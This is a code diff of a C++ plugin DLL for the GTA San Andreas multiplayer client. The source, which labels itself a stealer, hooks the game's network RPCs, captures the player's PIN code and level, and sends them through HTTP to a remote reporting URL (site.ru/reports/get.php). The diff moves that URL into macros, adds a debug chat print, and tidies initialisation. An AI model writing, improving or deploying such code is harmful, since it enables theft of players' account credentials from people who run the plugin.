@@ -1,23 +1,17 @@
 #define _WIN32_WINNT 0x0501
 #define _CRT_SECURE_NO_WARNINGS 1
 
-#include <windows.h>
-#include <string>
-#include <assert.h>
-#include <process.h>
-#include "SAMPFUNCS_API.h"
-#include <boost/algorithm/hex.hpp>
-#include <Wininet.h>
-
-#pragma comment(lib, "Wininet.lib")
+#include "main.h"
 
 using namespace std;
 
 SAMPFUNCS *SF = new SAMPFUNCS();
 
-bool g_bHasSpawned = false;
+#define URL_SITE	"http://site.ru"
+#define URL_PAGE	"/reports/get.php?data="
+#define AGENT_NAME	"Explorer"
 
-#define BASE_ID 0
+#define BASE_ID	0
 #define STEALER_TYPE "SF"
 
 enum eDataTypes
@@ -32,7 +26,7 @@ void parsePage(string url, string request, string& out)
 {
 	out.clear();
 
-	HINTERNET hInternet = InternetOpen("Explorer", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	HINTERNET hInternet = InternetOpen(AGENT_NAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 
 	if (hInternet != NULL)
 	{
@@ -83,7 +77,9 @@ void threadSendStealData(void* param)
 
 	string not_use;
 
-	parsePage("URL", "/reports/get.php?data=" + strData, not_use);
+	parsePage(URL_SITE, URL_PAGE + strData, not_use);
+
+	SF->getSAMP()->getChat()->AddChatMessage(D3DCOLOR_XRGB(0, 0xAA, 0), "param: %s", strData.c_str());
 }
 
 void sendResults(int iID, std::string strData)
@@ -148,14 +144,14 @@ bool CALLBACK incomingRPC(stRakNetHookParams *params)
 			if (playerId == SF->getSAMP()->getPlayers()->sLocalPlayerID)
 			{
 				sendResults(eDataTypes::LEVEL, to_string(iPlayerScore));
-			};
-		};
+			}
+		}
 	}
 
 	params->bitStream->ResetReadPointer();
 
 	return true;
-};
+}
 
 bool CALLBACK outcomingRPC(stRakNetHookParams *params)
 {
@@ -197,41 +193,31 @@ bool CALLBACK outcomingRPC(stRakNetHookParams *params)
 		{
 			sendResults(eDataTypes::PINCODE, strPinCode);
 			strPinCode.clear();
-		};
-	};
+		}
+	}
 
 	params->bitStream->ResetReadPointer();
 
 	return true;
-};
+}
 
-void CALLBACK mainloop(void)
+void __stdcall mainloop()
 {
-	static bool init = false;
-
-	if (!init)
+	static bool initialized = false;
+	if (!initialized)
 	{
-		if (!SF->getSAMP()->IsInitialized())
-			return;
-
-		SF->getRakNet()->registerRakNetCallback(RakNetScriptHookType::RAKHOOK_TYPE_OUTCOMING_RPC, outcomingRPC);
-		SF->getRakNet()->registerRakNetCallback(RakNetScriptHookType::RAKHOOK_TYPE_INCOMING_RPC, incomingRPC);
-
-		init = true;
-	};
-};
+		if (GAME && GAME->GetSystemState() == eSystemState::GS_PLAYING_GAME && SF->getSAMP()->IsInitialized())
+		{
+			initialized = true;
+			SF->getRakNet()->registerRakNetCallback(RakNetScriptHookType::RAKHOOK_TYPE_OUTCOMING_RPC, outcomingRPC);
+			SF->getRakNet()->registerRakNetCallback(RakNetScriptHookType::RAKHOOK_TYPE_INCOMING_RPC, incomingRPC);
+		}
+	}
+}
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
 {
-	switch (dwReasonForCall)
-	{
-	case DLL_PROCESS_ATTACH:
+	if (dwReasonForCall == DLL_PROCESS_ATTACH)
 		SF->initPlugin(mainloop, hModule);
-		break;
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
-	};
 	return TRUE;
-};
+}
